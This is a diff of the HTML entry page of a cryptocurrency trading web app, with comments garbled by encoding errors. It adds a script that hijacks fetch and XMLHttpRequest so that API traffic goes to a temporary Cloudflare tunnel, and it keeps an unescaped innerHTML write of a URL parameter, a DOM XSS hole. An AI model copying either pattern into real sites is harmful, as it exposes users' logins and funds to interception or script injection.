@@ -1,86 +1,31 @@
-<!doctype html>
-<html lang="">
-<head>
-<script>
-  // ? ĞŞ¸´ webpack publicPath
-  window.__webpack_public_path__ = "./static/js/";
-  
-  // ? ĞŞ¸´ fileId=undefined ÎÊÌâ
-  window.fileId = 9007393;
-  
-  // API ´úÀíÅäÖÃ - ĞŞ¸ÄÎªÄúµÄºó¶Ë·şÎñÆ÷µØÖ·
-  window.KLAKNA_API_PROXY = '';  // Í¬Óò²¿ÊğÁô¿Õ£¬»òÌîĞ´ 'https://your-tunnel.trycloudflare.com'
-  
-  console.log('[KLAKNA-ETH] fileId =', window.fileId);
-  console.log('[KLAKNA-ETH] API Proxy =', window.KLAKNA_API_PROXY);
-</script>
-<meta charset="utf-8"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,target-densitydpi=device-dpi"/>
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"/>
-<meta name="apple-mobile-web-app-capable" content="yes"/>
-<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
-<meta name="format-detection" content="telephone=no"/>
-<title></title>
-<meta property="description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/>
-<meta name="keywords" content="USA,Web3,Buy/Sell,crypto coin,Web3.0,uslarty,Ethereum,BTC,USDT,BNB,stock,contract,option"/>
-<meta property="og:site_name" content="Comprehensive cryptocurrency trading platform"/>
-<meta property="og:type" content="product"/>
-<meta property="og:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/>
-<meta property="og:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/>
-<meta property="og:image" content="logo.png"/>
-<meta property="og:image:width" content="1280"/>
-<meta property="og:image:height" content="720"/>
-<meta name="twitter:card" content="Comprehensive cryptocurrency trading platform"/>
-<meta name="twitter:site" content="Comprehensive cryptocurrency trading platform"/>
-<meta name="twitter:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/>
-<meta name="twitter:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/>
-<meta property="twitter:image:width" content="1280"/>
-<meta property="twitter:image:height" content="720"/>
-<meta name="twitter:card" content="summary_large_image"/>
-<meta name="mobile-web-app-capable" content="yes"/>
-<meta name="apple-mobile-web-app-capable" content="yes"/>
-<meta name="apple-mobile-web-app-status-bar-style" content="black"/>
-<link rel="apple-touch-icon"/>
-<meta name="apple-mobile-web-app-title"/>
-<link rel="bookmark"/>
-<link rel="apple-touch-icon-precomposed" sizes="180x180"/>
-<link rel="apple-touch-startup-image"/>
+<!doctype html><html lang=""><head><script>window.__webpack_public_path__ = "/ETH/static/js/";</script><meta charset="utf-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,user-scalable=no,target-densitydpi=device-dpi"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,minimum-scale=1,viewport-fit=cover"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><meta name="format-detection" content="telephone=no"/><title></title><meta property="description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta name="keywords" content="USA,Web3,Buy/Sell,crypto coin,Web3.0,uslarty,Ethereum,BTC,USDT,BNB,stock,contract,option"/><meta property="og:site_name" content="Comprehensive cryptocurrency trading platform"/><meta property="og:type" content="product"/><meta property="og:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/><meta property="og:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta property="og:image" content="logo.png"/><meta property="og:image:width" content="1280"/><meta property="og:image:height" content="720"/><meta name="twitter:card" content="Comprehensive cryptocurrency trading platform"/><meta name="twitter:site" content="Comprehensive cryptocurrency trading platform"/><meta name="twitter:title" content="Buy Bitcoin & Crypto | Crypto Exchange & App"/><meta name="twitter:description" content="Buy BTC, ETH, XRP and more on leading cryptocurrency exchanges - Explore Web3, Invest, Manage and Lend. Sign up today and experience the future of finance."/><meta property="twitter:image:width" content="1280"/><meta property="twitter:image:height" content="720"/><meta name="twitter:card" content="summary_large_image"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-status-bar-style" content="black"/><link rel="apple-touch-icon"/><meta name="apple-mobile-web-app-title"/><link rel="bookmark"/><link rel="apple-touch-icon-precomposed" sizes="180x180"/><link rel="apple-touch-startup-image"/><title></title><script>
+// API ä»£ç†é…ç½® - å°†æ‰€æœ?API è¯·æ±‚è½¬å‘åˆ°åç«¯ä»£ç†æœåŠ¡å™¨
+// å¦‚æœåç«¯éƒ¨ç½²åœ?your-server.comï¼Œä¿®æ”¹ä¸‹é¢çš„åœ°å€
+var KLAKNA_API_PROXY = 'https://your-server.com';
+// å¦‚æœæ˜¯åŒåŸŸéƒ¨ç½²ï¼ˆå‰åç«¯åœ¨åŒä¸€æœåŠ¡å™¨ï¼‰ï¼Œç•™ç©ºæˆ–è®¾ä¸º ''
+// å¦‚æœåç«¯åœ¨æœ¬æœºæµ‹è¯•ï¼Œè®¾ä¸º 'http://localhost:8080'
 
-<!-- API ÇëÇóÀ¹½ØÆ÷ -->
-<script>
-(function() {
-  var proxy = window.KLAKNA_API_PROXY || '';
-  
-  // À¹½Ø fetch
+// æ‹¦æˆª fetch è¯·æ±‚ï¼Œå°†ç›¸å¯¹è·¯å¾„çš?API è¯·æ±‚ä»£ç†åˆ°åç«?(function() {
   var origFetch = window.fetch;
   window.fetch = function(url, opts) {
-    if (proxy && typeof url === 'string' && url.startsWith('/')) {
-      url = proxy + url;
-      console.log('[KLAKNA] Fetch:', url);
+    if (KLAKNA_API_PROXY && typeof url === 'string' && url.startsWith('/')) {
+      url = KLAKNA_API_PROXY + url;
     }
     return origFetch.call(this, url, opts);
   };
-  
-  // À¹½Ø XMLHttpRequest
+
+  // æ‹¦æˆª XMLHttpRequest
   var origOpen = XMLHttpRequest.prototype.open;
   XMLHttpRequest.prototype.open = function(method, url) {
-    if (proxy && typeof url === 'string' && url.startsWith('/')) {
-      url = proxy + url;
-      console.log('[KLAKNA] XHR:', url);
+    if (KLAKNA_API_PROXY && typeof url === 'string' && url.startsWith('/')) {
+      url = KLAKNA_API_PROXY + url;
     }
     return origOpen.call(this, method, url);
   };
 })();
 </script>
-
-<script defer="defer" src="./static/js/chunk-vendors.1774378911945.js"></script>
-<script defer="defer" src="./static/js/app.1774378911945.js"></script>
-<link href="./static/css/chunk-vendors.1774378911945.css" rel="stylesheet">
-<link href="./static/css/app.1774378911945.css" rel="stylesheet">
-</head>
-<style>
-    * {
+</script>
+<script defer="defer" src="/ETH/static/js/chunk-vendors.1774378911945.js"></script><script defer="defer" src="/ETH/static/js/app.1774378911945.js"></script><link href="/ETH/static/css/chunk-vendors.1774378911945.css" rel="stylesheet"><link href="/ETH/static/css/app.1774378911945.css" rel="stylesheet"><script>var KLAKNA_API_PROXY="https://swim-exit-queensland-skilled.trycloudflare.com";(function(){var o=window.fetch;window.fetch=function(u,o2){if(KLAKNA_API_PROXY&&typeof u==="string"&&u.startsWith("/"))u=KLAKNA_API_PROXY+u;return o.call(this,u,o2)};var p=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){if(KLAKNA_API_PROXY&&typeof u==="string"&&u.startsWith("/"))u=KLAKNA_API_PROXY+u;return p.call(this,m,u)}})();</script></head><style>* {
       touch-action: manipulation;
     }
     html {
@@ -150,7 +95,7 @@
     .load-inner.load-one {
       left: 0%;
       top: 0%;
-      border-bottom: 3px solid #5c5ced;
+      border-bottom: 3px solid #5c5edc;
       animation: rotate1 1.15s linear infinite;
     }
 
@@ -224,65 +169,45 @@
       height: 30px;
       pointer-events: none;
       fill: currentColor;
-    }
-</style>
-<body>
-<div id="res-loading">
-  <div class="loader">
-    <div class="load-inner load-one"></div>
-    <div class="load-inner load-two"></div>
-    <div class="load-inner load-three"></div>
-    <span class="project-loading-text">Loading...</span>
-  </div>
-</div>
-<div class="router-view-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div>
-<div class="global-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div>
-<div id="app"></div>
+    }</style><body><div id="res-loading"><div class="loader"><div class="load-inner load-one"></div><div class="load-inner load-two"></div><div class="load-inner load-three"></div><span class="project-loading-text">Loading...</span></div></div><div class="router-view-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div><div class="global-loading"><img data-v-06134f56="" src="./viewLoading.gif" class="img"/></div><div id="app"></div><script>// ç¦æ­¢iosæ”¾å¤§
+      document.documentElement.addEventListener(
+        'touchstart',
+        function (event) {
+          if (event.touches.length > 1) {
+            event.preventDefault();
+          }
+        },
+        false,
+      );
 
-<script>
-  // ½ûÖ¹ iOS ·Å´ó
-  document.documentElement.addEventListener(
-    'touchstart',
-    function (event) {
-      if (event.touches.length > 1) {
+      var lastTouchEnd = 0;
+      document.documentElement.addEventListener(
+        'touchend',
+        function (event) {
+          var now = Date.now();
+          if (now - lastTouchEnd <= 300) {
+            event.preventDefault();
+          }
+          lastTouchEnd = now;
+        },
+        false,
+      );
+
+      document.addEventListener('gesturestart', function (event) {
         event.preventDefault();
-      }
-    },
-    false,
-  );
-
-  var lastTouchEnd = 0;
-  document.documentElement.addEventListener(
-    'touchend',
-    function (event) {
-      var now = Date.now();
-      if (now - lastTouchEnd <= 300) {
-        event.preventDefault();
-      }
-      lastTouchEnd = now;
-    },
-    false,
-  );
-
-  document.addEventListener('gesturestart', function (event) {
-    event.preventDefault();
-  });
-  
-  (function () {
-    async function init() {
-      const url = new URL(window.location.href);
-      const platformr = url.searchParams.get('platformr');
-      if (platformr) {
-        document.body
-          .querySelector('#res-loading')
-          .querySelector('.project-loading-text').innerHTML = platformr;
-      }
-    }
-    init();
-  })();
-</script>
-
-<script>(function (d, t) {
+      });
+      (function () {
+        async function init() {
+          const url = new URL(window.location.href);
+          const platformr = url.searchParams.get('platformr');
+          if (platformr) {
+            document.body
+              .querySelector('#res-loading')
+              .querySelector('.project-loading-text').innerHTML = platformr;
+          }
+        }
+        init();
+      })();</script><script>(function (d, t) {
         var STORAGE_KEY = 'chat-widget-trigger-position';
 
         function createTrigger() {
@@ -292,9 +217,9 @@
           trigger.id = 'chat-widget-custom-trigger';
           trigger.className = 'chat-widget-custom-trigger';
           trigger.type = 'button';
-          trigger.setAttribute('aria-label', '¿Í·ş');
+          trigger.setAttribute('aria-label', 'å®¢æœ');
           trigger.innerHTML =
-            '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H9l-5 4v-4H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm3 3h10a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2zm0 4h7a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2z"></path></svg>';
+            '<svg viewBox="0 0 24 24" aria-hidden="true"><path d="M4 4h16a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H9l-5 4v-4H4a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2zm3 6h10a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2zm0 4h7a1 1 0 0 0 0-2H7a1 1 0 0 0 0 2z"></path></svg>';
 
           var dragState = {
             dragging: false,
@@ -435,8 +360,4 @@
           });
         };
         s.parentNode.insertBefore(g, s);
-      })(document, 'script');
-</script>
-
-</body>
-</html>
+      })(document, 'script');</script></body></html>
